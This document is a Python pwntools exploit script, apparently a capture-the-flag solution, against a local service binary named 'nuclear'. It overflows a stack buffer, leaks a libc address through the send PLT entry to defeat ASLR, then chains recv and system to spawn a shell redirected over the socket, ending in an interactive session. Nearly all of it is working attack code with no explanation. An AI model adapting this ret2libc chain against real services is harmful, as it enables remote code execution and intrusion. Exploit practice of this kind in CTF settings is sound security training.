from pwn import *
import time
s = remote("localhost", 1129)
e = ELF("./nuclear")
binsh = "/bin/sh>$4 <$4\x00"
ppppr = 0x0804917c
send_plt = e.plt['send']
recv_plt = e.plt['recv']
sleep_got = e.got['sleep']
sleep_offset = 0x000af040
#sleep_offset = 0x000b6040  wrong offset?
#system_offset = 0x000403b0 wrong offset?
system_offset = 0x0003a940
def launch():
    s.sendline("launch")
    s.sendlineafter(": ", "th1s 1s p4ssc0d3:)")
    print s.recv(1024)
    pause()
payload = ""
payload += "A"*(0x20C + 4)
payload += p32(send_plt)
payload += "AAAA"
payload += p32(4)
payload += p32(sleep_got)
payload += p32(4)
payload += p32(0)
launch()
s.recv(1024)
s.sendline(payload)
sleep_libc = u32(s.recv(4))
libc_base = sleep_libc - sleep_offset
system_libc = libc_base + system_offset
print "sleep : " + hex(sleep_libc)
print "libc_base : " + hex(libc_base)
print "system : " + hex(system_libc)
s.close()
##################################
s = remote("localhost", 1129)
payload2 = ""
payload2 += 'A'*(0x20C + 4)
payload2 += p32(recv_plt)
payload2 += p32(ppppr)
payload2 += p32(4)
payload2 += p32(e.bss()-8)
payload2 += p32(len(binsh))
payload2 += p32(0)
payload2 += p32(system_libc)
payload2 += "AAAA"
payload2 += p32(e.bss()-8)
launch()
s.sendline(payload2)
s.send(binsh)
sleep(0.1)
##################################
s.interactive()
